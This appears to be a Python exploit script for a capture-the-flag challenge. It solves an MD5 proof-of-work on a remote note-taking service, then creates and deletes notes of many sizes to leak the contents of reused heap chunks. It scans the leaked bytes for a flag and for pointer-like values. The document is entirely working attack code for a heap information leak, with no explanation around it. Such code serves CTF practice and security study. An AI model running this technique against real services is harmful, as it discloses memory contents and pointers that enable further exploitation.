"""514 实验：用 length=0（或最小写入）创建笔记，读回被复用旧块的内容，按尺寸类别扫描 flag。"""
import hashlib
import itertools
import re
import socket
import string
import sys
import time

HOST, PORT = "env.xj.edisec.net", 30410


def drain(s, wait=0.7):
    s.settimeout(0.22)
    buf = b""
    end = time.monotonic() + wait
    while time.monotonic() < end:
        try:
            d = s.recv(16384)
        except socket.timeout:
            continue
        if not d:
            break
        buf += d
    return buf


def solve_pow(md5hex, masked):
    pos = [i for i, ch in enumerate(masked) if ch == "_"]
    fixed = list(masked)
    for combo in itertools.product(string.ascii_uppercase, repeat=len(pos)):
        for i, ch in zip(pos, combo):
            fixed[i] = ch
        if hashlib.md5("".join(fixed).encode()).hexdigest() == md5hex:
            return "".join(combo)
    raise SystemExit("pow failed")


s = socket.create_connection((HOST, PORT), timeout=8)
banner = drain(s, 1.5)
masked = re.search(rb"Token:\s*([A-Za-z_]+)", banner).group(1).decode()
md5hex = re.search(rb"MD5:\s*([0-9a-f]{32})", banner).group(1).decode()
s.sendall(solve_pow(md5hex, masked).encode() + b"\n")
drain(s, 1.2)


def cmd(*lines):
    out = b""
    for ln in lines:
        s.sendall(str(ln).encode() + b"\n")
        out += drain(s, 0.75)
    return out


def parse(r):
    m = re.search(rb"len=(\d+) cap=(\d+)\n([0-9a-f]*)\n", r)
    if not m:
        return None
    return int(m.group(1)), int(m.group(2)), bytes.fromhex(m.group(3).decode())


print("== 先试 length=0 是否允许 ==")
r = cmd(1, 0, "z", 512, 0, "")
print("create(len=0) ->", repr(r[:200]))
r2 = cmd(3, 0)
print("show ->", repr(r2[:300]))

hits = []
for reserve in [16, 24, 32, 48, 64, 96, 128, 192, 256, 384, 512]:
    cmd(5, 0)                      # delete slot0（若存在）
    cmd(1, 0, "r%d" % reserve, reserve, 1, "00")   # 最小写入 1 字节
    r = cmd(3, 0)
    d = parse(r)
    if d:
        blob = d[2]
        interesting = re.findall(rb"[ -~]{6,}", blob)[:6]
        print("reserve=%-4d cap=%-4d 可读片段: %s" % (reserve, d[1], interesting))
        hits.append((reserve, blob))
    else:
        print("reserve=%-4d -> %r" % (reserve, r[:120]))

allblob = b"".join(b for _, b in hits)
print("== 扫描 flag 字样:", re.findall(rb"[Ff][Ll][Aa][Gg].{0,40}", allblob)[:6])
ptrs = [int.from_bytes(allblob[i:i + 8], "little") for i in range(0, max(0, len(allblob) - 8), 8)]
print("== 可疑指针:", sorted({hex(p) for p in ptrs if 0x10000 < p < 0x800000000000})[:15])
s.close()